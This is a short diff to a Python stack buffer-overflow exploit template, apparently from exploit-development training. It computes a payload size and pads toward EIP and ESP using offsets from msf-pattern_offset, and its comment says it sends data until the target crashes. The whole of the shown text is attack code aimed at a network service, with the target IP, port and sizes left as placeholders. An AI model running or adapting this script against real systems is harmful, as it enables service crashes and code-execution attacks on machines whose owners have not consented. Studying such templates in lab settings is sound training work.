@@ -6,10 +6,14 @@ import socket, sys
 # CHANGE THESE!!!
 target_IP = '[IP]'
 target_port = [port]
+
+## Enter the amount of the total crash + extra ~400 characters
+size = [crash amount from #1 + extra ~400 characters]
+
 ## Enter in the msf-pattern_offset amount.
 filler_to_EIP = "A" * [input length outputed by msf-pattern_offset]
 EIP = "B" * 4
-filler_to_ESP = "C" * 500
+filler_to_ESP = "C" * (size - len(filler_to_EIP + EIP))
 
 # Try statement that will send data until it receives an exception from the target host where it is no longer reachable because we crashed it.
 try:
